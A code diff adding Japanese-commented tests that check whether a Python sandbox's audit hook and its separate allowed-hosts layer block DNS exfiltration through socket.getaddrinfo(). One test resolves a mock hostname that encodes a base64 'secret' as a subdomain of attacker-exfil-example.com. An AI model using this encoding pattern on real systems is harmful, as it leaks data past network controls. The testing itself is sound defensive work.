@@ -37,6 +37,17 @@ NAME = "イェグディエルの封印網 (Jegudiel's Sealed Net - 深層保護�
 # ない――Docker等によるOSレベルのネットワーク隔離(`--network none`)が
 # 一次防衛線であることは、本ファイルより前の`cassiels_veil`関連の
 # GRIMOIRE記述(§L等)が既に明記している前提と同じである。
+#
+# [新設 2026-11 §CT] `connect`を一切経由しない接続不要の送信経路として、
+# UDPの`sendto`/`sendmsg`(§CA/§CM)とは別に、`socket.getaddrinfo()`による
+# DNS名前解決そのものが、機密データをサブドメインラベルに符号化して
+# 外部(攻撃者が管理する権威DNSサーバー)へ送出できる「DNS exfiltration」
+# 経路になっていることを発見した。本ファイルの`forbidden`集合に
+# "socket.getaddrinfo"を追加した修正の、継続的な再検証を本天使に追加
+# する。独立した別の防御層である`sefer/__init__.py`の
+# `_michael_absolute_defense`も、同じ理由で"socket.getaddrinfo"を
+# `ALWAYS_PASSTHROUGH_AUDIT_EVENTS`から除外し、専用のallowed_hosts検査
+# を新設する同種の修正を別途行った(GRIMOIRE.md §CT参照)。
 
 sys.path.insert(0, str(ROOT))
 
@@ -130,11 +141,119 @@ def _check_udp_sendmsg_is_allowed_when_unsealed() -> tuple:
         s.close()
 
 
+def _check_getaddrinfo_is_blocked_while_sealed() -> tuple:
+    """[新設 §CT] 封鎖中にsocket.getaddrinfo()によるDNS名前解決(DNS
+    exfiltration経路)が正しく遮断されるかを確認する。戻り値:
+    (success: bool, detail: str)"""
+    import maquina_gatekeeper as mg
+
+    mg._register_audit_hook_once()
+    mg.set_sanctuary_sealed(True)
+    try:
+        try:
+            socket.getaddrinfo("leak-via-dns-exfil.example.invalid", 80)
+            return False, "封鎖中にsocket.getaddrinfo()によるDNS名前解決が遮断されなかった"
+        except mg.LossOfAtaraxia:
+            return True, "OK"
+        except OSError as e:
+            # [正直な注記] 本検査が使う".invalid"(RFC 2606の予約TLD)は、
+            # 実際のDNSサーバーが存在するかどうかに関わらず、そもそも
+            # 絶対に解決できないよう予約されている。したがって、本フック
+            # が正しく遮断していれば実際のOS解決処理に到達する前に
+            # `LossOfAtaraxia`が発生するはずで、ここに到達するのは
+            # 「遮断されず実際のOS解決処理まで進んでしまった」ことの証拠
+            # である(=封鎖が機能していない)。これを安全側に倒して失敗
+            # として報告する(OSErrorを遮断成功と誤判定しない)。
+            return False, f"封鎖中にsocket.getaddrinfo()が遮断されず、実際のOS解決処理まで進んでしまった(OSError: {e})"
+    finally:
+        mg.set_sanctuary_sealed(False)
+
+
+def _check_getaddrinfo_is_allowed_when_unsealed() -> tuple:
+    """[新設 §CT・誤検知防止] 封鎖していない通常時は、
+    socket.getaddrinfo()が誤って遮断されないかを確認する。戻り値:
+    (success: bool, detail: str)"""
+    import maquina_gatekeeper as mg
+
+    mg._register_audit_hook_once()
+    if mg.is_sanctuary_sealed():
+        return False, "前提条件の異常: 検査開始時点で既に封鎖状態になっている"
+    try:
+        try:
+            socket.getaddrinfo("127.0.0.1", 80)
+        except OSError:
+            # [正直な注記] ネットワーク・DNS到達性の制約によるOSErrorは、
+            # 本検査が確認したい「深層保護による誤遮断の有無」とは無関係
+            # なため、安全に無視する(mg.LossOfAtaraxiaのみを本当の
+            # 検知対象とする)。
+            pass
+        except mg.LossOfAtaraxia:
+            return False, "封鎖していないのにsocket.getaddrinfo()が誤って遮断された"
+        return True, "OK"
+    except Exception as e:
+        return False, f"予期しない例外: {type(e).__name__}: {e}"
+
+
+def _check_sefer_sanctum_blocks_unapproved_getaddrinfo() -> tuple:
+    """[新設 §CT] `maquina_gatekeeper.py`とは独立した別の防御層である
+    `sefer.Sanctum`(allowed_hosts方式)自身も、同じDNS exfiltration
+    経路を正しく遮断することを確認する。許可ホストに含まれていない
+    ホスト名(機密データを符号化したサブドメインを模したもの)での
+    socket.getaddrinfo()が、`sefer.LossOfAtaraxia`として遮断される
+    ことを直接確認する。戻り値: (success: bool, detail: str)"""
+    import sefer
+
+    "warmup".encode("idna")
+    secret_payload = "c2VjcmV0LWRhdGEtMTIzNDU"
+    hostname = f"{secret_payload}.attacker-exfil-example.com"
+    try:
+        with sefer.Sanctum(allowed_dirs=["/tmp"], allowed_hosts={"approved.example.com"}):
+            try:
+                socket.getaddrinfo(hostname, 80)
+                return False, "sefer.Sanctum起動中に許可外ホスト名でのgetaddrinfo()が遮断されなかった"
+            except sefer.LossOfAtaraxia:
+                return True, "OK"
+            except OSError as e:
+                # [正直な注記] 上のmaquina_gatekeeper版と同じ理由により、
+                # ここに到達すること自体が「遮断されず実際のOS解決処理
+                # まで進んでしまった」ことの証拠であり、安全側に倒して
+                # 失敗として報告する。
+                return False, f"sefer.Sanctumが遮断せず、実際のOS解決処理まで進んでしまった(OSError: {e})"
+    finally:
+        pass
+
+
+def _check_sefer_sanctum_allows_approved_host_getaddrinfo() -> tuple:
+    """[新設 §CT・誤検知防止] `sefer.Sanctum`が、allowed_hostsに含まれる
+    ホスト名でのgetaddrinfo()、およびバインド用のNone(AI_PASSIVE)解決
+    を誤って遮断しないことを確認する。戻り値: (success: bool, detail: str)"""
+    import sefer
+
+    "warmup".encode("idna")
+    try:
+        with sefer.Sanctum(allowed_dirs=["/tmp"], allowed_hosts={"127.0.0.1"}):
+            try:
+                socket.getaddrinfo("127.0.0.1", 80)
+            except sefer.LossOfAtaraxia as e:
+                return False, f"許可ホストへの正当なgetaddrinfo()が誤って遮断された: {e}"
+            try:
+                socket.getaddrinfo(None, 8080, 0, socket.SOCK_STREAM, 0, socket.AI_PASSIVE)
+            except sefer.LossOfAtaraxia as e:
+                return False, f"バインド用のgetaddrinfo(None, ...)が誤って遮断された: {e}"
+        return True, "OK"
+    except Exception as e:
+        return False, f"予期しない例外: {type(e).__name__}: {e}"
+
+
 CHECKS = [
     ("maquina_gatekeeper.ultimate_audit_hook: UDP sendto遮断", _check_udp_sendto_is_blocked_while_sealed),
     ("maquina_gatekeeper.ultimate_audit_hook: 非封鎖時の誤検知防止(sendto)", _check_udp_sendto_is_allowed_when_unsealed),
     ("maquina_gatekeeper.ultimate_audit_hook: UDP sendmsg遮断(§CM)", _check_udp_sendmsg_is_blocked_while_sealed),
     ("maquina_gatekeeper.ultimate_audit_hook: 非封鎖時の誤検知防止(sendmsg, §CM)", _check_udp_sendmsg_is_allowed_when_unsealed),
+    ("maquina_gatekeeper.ultimate_audit_hook: DNS名前解決遮断(§CT)", _check_getaddrinfo_is_blocked_while_sealed),
+    ("maquina_gatekeeper.ultimate_audit_hook: 非封鎖時の誤検知防止(getaddrinfo, §CT)", _check_getaddrinfo_is_allowed_when_unsealed),
+    ("sefer.Sanctum: DNS名前解決の許可ホスト検査(§CT)", _check_sefer_sanctum_blocks_unapproved_getaddrinfo),
+    ("sefer.Sanctum: 許可ホスト・バインド用解決の誤検知防止(§CT)", _check_sefer_sanctum_allows_approved_host_getaddrinfo),
 ]
 
 
@@ -179,8 +298,11 @@ def main():
 
     report_pass(
         NAME,
-        "封鎖中のUDP sendto()・sendmsg()による接続不要のデータ送信が正しく遮断され、"
-        "かつ非封鎖時にはいずれも誤って遮断されないことを確認しました。",
+        "封鎖中のUDP sendto()・sendmsg()による接続不要のデータ送信、"
+        "およびgetaddrinfo()によるDNS名前解決(§CT、maquina_gatekeeper・"
+        "sefer.Sanctumの両方の独立した防御層)がいずれも正しく遮断され、"
+        "かつ非封鎖時・許可ホスト・バインド用解決はいずれも誤って"
+        "遮断されないことを確認しました。",
     )
 
 
